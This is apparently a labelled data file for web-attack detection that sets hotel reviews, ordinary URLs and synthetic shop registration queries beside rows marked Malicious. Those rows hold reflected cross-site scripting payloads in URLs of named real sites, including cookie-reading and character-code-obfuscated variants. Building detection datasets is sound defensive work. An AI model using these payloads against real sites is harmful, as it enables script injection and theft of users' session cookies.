Payloads,Class,decoded,executed,parser_changed
"most hotels were booked solid this night, i called,booked the last room here.... ...busy night for hotels in phx. i booked the last room here,1 night and when i landed in phx that eve, approx 10p..i was a bit wary. courtsy ph@bag claim for ap p/u. van p/u was prompt, and the driver was friendly and courtious. the hotel is a short distance from the hotel. checkin was very pleasant, and the staff were very nice. i was on the 2nd of 3 floors, facing the street, and as it is on a side street even still, very quiet. my room was very clean and with 2 large queen beds in very nice condition with white sheets, not dusty, as some linen can be. very clean rm/not dusty .the room was nicely appointed, with basic functional furnature. a desk was roomy for computer work. the heater/aircon was a windown unit, without thermostat, these are always a pain to get the proper temperture. hot water was plentiful, and the shower was super.breakfast buffet overboard with waffles and lots of other stuff, fill up on these things and you'll be set for hours. i ate a very good doughnut,called 4 a taxi he arrived in 10 min@0700. free room internet :) a very super stay at last min. hotel is not budget hotel, but worth the money. an excellent sleep, and very relaxing restful night",Benign,"most hotels were booked solid this night, i called,booked the last room here.... ...busy night for hotels in phx. i booked the last room here,1 night and when i landed in phx that eve, approx 10p..i was a bit wary. courtsy ph@bag claim for ap p/u. van p/u was prompt, and the driver was friendly and courtious. the hotel is a short distance from the hotel. checkin was very pleasant, and the staff were very nice. i was on the 2nd of 3 floors, facing the street, and as it is on a side street even still, very quiet. my room was very clean and with 2 large queen beds in very nice condition with white sheets, not dusty, as some linen can be. very clean rm/not dusty .the room was nicely appointed, with basic functional furnature. a desk was roomy for computer work. the heater/aircon was a windown unit, without thermostat, these are always a pain to get the proper temperture. hot water was plentiful, and the shower was super.breakfast buffet overboard with waffles and lots of other stuff, fill up on these things and you'll be set for hours. i ate a very good doughnut,called 4 a taxi he arrived in 10 min@0700. free room internet :) a very super stay at last min. hotel is not budget hotel, but worth the money. an excellent sleep, and very relaxing restful night",False,False
http://www.wikihow.com/clean-up-when-you-really-don%27t-want-to&t=1396613570526&n=4820796&k=mainentity,Benign,http://www.wikihow.com/clean-up-when-you-really-don't-want-to&t=1396613570526&n=4820796&k=mainentity,False,False
http://www.nbflight.com/search.asp?field=title&amp;bigclassname=%3cscript%3ealert(%22xss%22)%3c/script%3<br>e&amp;smallclassname=&amp;keyword=xss&amp;submit=search,Malicious,"http://www.nbflight.com/search.asp?field=title&bigclassname=<script>alert(""xss"")</script>&smallclassname=&keyword=xss&submit=search",True,True
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=trumaine&password=-incestuosamente&nombre=petrona&apellidos=brasc%f3+van+derdys&email=gerber%40cortell.no&dni=29909342g&direccion=c%2f+quintana%2c+8%2c+&ciudad=vilanova+de+l%27aguda&cp=07570&provincia=barcelona&ntc=3684116630945403&b1=registrar,Benign,"http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=trumaine&password=-incestuosamente&nombre=petrona&apellidos=brasc� van derdys&email=gerber@cortell.no&dni=29909342g&direccion=c/ quintana, 8, &ciudad=vilanova de l'aguda&cp=07570&provincia=barcelona&ntc=3684116630945403&b1=registrar",False,False
"amazing interior the lobby of this hotel is stunning. check-in was quick and efficient. the rooms were a little disappointing - the beds were very comfortable, but the bathroom was really small. whilst the staff in the restuarant weren't rude, they were very abrupt and could be more cheerful. the concierge was very helpful with providing advice and helping to book airport transfers.",Benign,"amazing interior the lobby of this hotel is stunning. check-in was quick and efficient. the rooms were a little disappointing - the beds were very comfortable, but the bathroom was really small. whilst the staff in the restuarant weren't rude, they were very abrupt and could be more cheerful. the concierge was very helpful with providing advice and helping to book airport transfers.",False,False
http://www.kanald.com.tr/uyelik/bilgi.asp?strmes=&lt;script&gt;alert(&quot;scriptorium(turkey)<br>hackhaber.com&quot;)&lt;/script&gt;,Malicious,"http://www.kanald.com.tr/uyelik/bilgi.asp?strmes=<script>alert(""scriptorium(turkey)hackhaber.com"")</script>",True,True
http://www.sun.com/corp_emp/zone/search.cgi?req=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.sun.com/corp_emp/zone/search.cgi?req=""><script>alert(""maxwel"")</script>",True,True
"wonderful occidental grand just got back on january 26th from our weeks stay at the royal club in the occidental grand. this is our 3rd visit to this hotel in just 2 years and we are going back in may. our 1st visit there we decided to join the allegro vacation club knowing full well that we would be traveling quite a bit to all the resorts that are part of the vacation club. to us it was well worth it!i personally think this resort is a hidden gem among all the hotels in punta cana. granted i have not been to the top 5' resorts, and i am sure they are wonderful, but my husband and i really love this resort.the royal club was fantastic! i would highly recommend paying the extra to stay in this area of the resort. 3 buildings (19, 20 and 21) and i believe it has about 56 units. there is a huge jacuzzi in the courtyard, private check-in, and the best part is the restaurant! our breakfasts, lunches and dinners were delicious. i have never eaten like that on a daily basis. the service was outstanding, the qualify of the food was wonderful and the presentation was great. it's tough to come home and have to start cooking after being spoiled for a week.the royal club has its own area on the beach. if you don't have the right color wrist band you are not allowed to use this area, and there is a guard that is posted there all the time. there is also a bar located there which makes it very convenient!we left our maid $5.00/day. in the past we left a couple of dollars and some small gifts, but last time we went we had 2 guys cleaning our room and i had only brought stuff for a woman and i felt bad. $5.00/day is not bad, plus i left little miniature chocolates or a pack of gum or mints also. all the employees are so nice. some people understand english pretty well, while others just can understand the basics. we are in their country and my husband and i can't speak but a few words of spanish, so we try to phase our sentences in basic english. everyone has a smile and we also say hola when passing anyone. the servers, maids and bartenders work 12 days on and have 3 days off. i think by the end of their work 'week' they are pretty burnt out which is probably why a lot of people complain about the service. just be patient! this resort is big and there is a lot of walking, which is good exercise! the front lobby has been up",Benign,"wonderful occidental grand just got back on january 26th from our weeks stay at the royal club in the occidental grand. this is our 3rd visit to this hotel in just 2 years and we are going back in may. our 1st visit there we decided to join the allegro vacation club knowing full well that we would be traveling quite a bit to all the resorts that are part of the vacation club. to us it was well worth it!i personally think this resort is a hidden gem among all the hotels in punta cana. granted i have not been to the top 5' resorts, and i am sure they are wonderful, but my husband and i really love this resort.the royal club was fantastic! i would highly recommend paying the extra to stay in this area of the resort. 3 buildings (19, 20 and 21) and i believe it has about 56 units. there is a huge jacuzzi in the courtyard, private check-in, and the best part is the restaurant! our breakfasts, lunches and dinners were delicious. i have never eaten like that on a daily basis. the service was outstanding, the qualify of the food was wonderful and the presentation was great. it's tough to come home and have to start cooking after being spoiled for a week.the royal club has its own area on the beach. if you don't have the right color wrist band you are not allowed to use this area, and there is a guard that is posted there all the time. there is also a bar located there which makes it very convenient!we left our maid $5.00/day. in the past we left a couple of dollars and some small gifts, but last time we went we had 2 guys cleaning our room and i had only brought stuff for a woman and i felt bad. $5.00/day is not bad, plus i left little miniature chocolates or a pack of gum or mints also. all the employees are so nice. some people understand english pretty well, while others just can understand the basics. we are in their country and my husband and i can't speak but a few words of spanish, so we try to phase our sentences in basic english. everyone has a smile and we also say hola when passing anyone. the servers, maids and bartenders work 12 days on and have 3 days off. i think by the end of their work 'week' they are pretty burnt out which is probably why a lot of people complain about the service. just be patient! this resort is big and there is a lot of walking, which is good exercise! the front lobby has been up",False,False
http://www.presidency.gr/omilies.asp?search_ok=1&amp;find_spec=%22%3cscript%3ealert%28%2fst%40r-gaz3r%2f<br>%29%3c%2fscript%3e%3cmarquee%3e%3ch1%3est%40r-gaz3r%3c%2fh1%3e%3c%2fmarquee%3e&amp;date_start=&amp;date_end=,Malicious,"http://www.presidency.gr/omilies.asp?search_ok=1&find_spec=""<script>alert(/st@r-gaz3r/)</script><marquee><h1>st@r-gaz3r</h1></marquee>&date_start=&date_end=",True,True
http://www.indirbir.com/arama.php?q=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.indirbir.com/arama.php?q=""><script>alert(document.cookie)</script>",True,True
http://www.staples.co.uk/eng/catalog/cat_results.asp?txtsearch=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.staples.co.uk/eng/catalog/cat_results.asp?txtsearch=""><script>alert(""maxwel"")</script>",True,True
http://www.wikihow.com/ask-someone-out-with-ease&t=1396612162054&n=4778018&k=mainentity,Benign,http://www.wikihow.com/ask-someone-out-with-ease&t=1396612162054&n=4778018&k=mainentity,False,False
http://excellsupots.net/u.asp?u=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://excellsupots.net/u.asp?u=""><script>alert(""maxwel"")</script>",True,True
http://kanpo.net/kanpo/cgi-bin/a-news/a-news.cgi?date=2007.11.30&amp;cal=%22%3e%27%3e%3c%73%63%72%69%70%<br>74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%3<br>1%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31<br>%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious,"http://kanpo.net/kanpo/cgi-bin/a-news/a-news.cgi?date=2007.11.30&cal="">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
",True,True
registro&login=ketchum&password=p21ita1a&nombre=nedra&apellidos=derch+mallol&email=davids%40chuecafamily.gov&dni=55341505d&direccion=calle+fomento%2c+197%2c+3b&ciudad=coru%f1a+del+conde&cp=43364&provincia=barcelona&ntc=3368084974828178&b1=registrar,Benign,"registro&login=ketchum&password=p21ita1a&nombre=nedra&apellidos=derch mallol&email=davids@chuecafamily.gov&dni=55341505d&direccion=calle fomento, 197, 3b&ciudad=coru�a del conde&cp=43364&provincia=barcelona&ntc=3368084974828178&b1=registrar",False,False
http://fog.adsv.jp/30sec/30sec.php?sec=1&amp;mode=1&amp;load=1&amp;rand=562&amp;low=2&amp;size=3875&amp;alt=%22%3e%3cscript%<br>3ealert(123)%3c/script%3e,Malicious,"http://fog.adsv.jp/30sec/30sec.php?sec=1&mode=1&load=1&rand=562&low=2&size=3875&alt=""><script>alert(123)</script>",True,True
"absolutely great i found the chelsea lodge using tripadvisor. tripavisor has earned its keep with this one!$109/night in manhattan - can't beat the price. it was probably the cleanest hotel i have ever stayed in - for any price.the rooms have their own sink and shower, but you have to use the shared bathrooms. all the above are exceptionally clean. i have definitely paid more for a dirtier, but private, bathroom. don't let this scare you off - the chelsea lodge is a great place.",Benign,"absolutely great i found the chelsea lodge using tripadvisor. tripavisor has earned its keep with this one!$109/night in manhattan - can't beat the price. it was probably the cleanest hotel i have ever stayed in - for any price.the rooms have their own sink and shower, but you have to use the shared bathrooms. all the above are exceptionally clean. i have definitely paid more for a dirtier, but private, bathroom. don't let this scare you off - the chelsea lodge is a great place.",False,False
http://www.deltaprop.com/shopcustadmin.asp?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.deltaprop.com/shopcustadmin.asp?msg=""><script>alert(document.cookie)</script>",True,True
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=natalie&password=c21i04&nombre=juanmar%eda&apellidos=payas+credid%edo&email=jerome%40nutrimama.sb&dni=22975080n&direccion=travesia+bazan%2c+s%2fn%2c+4-h&ciudad=santib%e1%f1ez+el+alto&cp=25442&provincia=girona&ntc=4325308116770728&b1=registrar,Benign,"http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=natalie&password=c21i04&nombre=juanmar�a&apellidos=payas credid�o&email=jerome@nutrimama.sb&dni=22975080n&direccion=travesia bazan, s/n, 4-h&ciudad=santib��ez el alto&cp=25442&provincia=girona&ntc=4325308116770728&b1=registrar",False,False
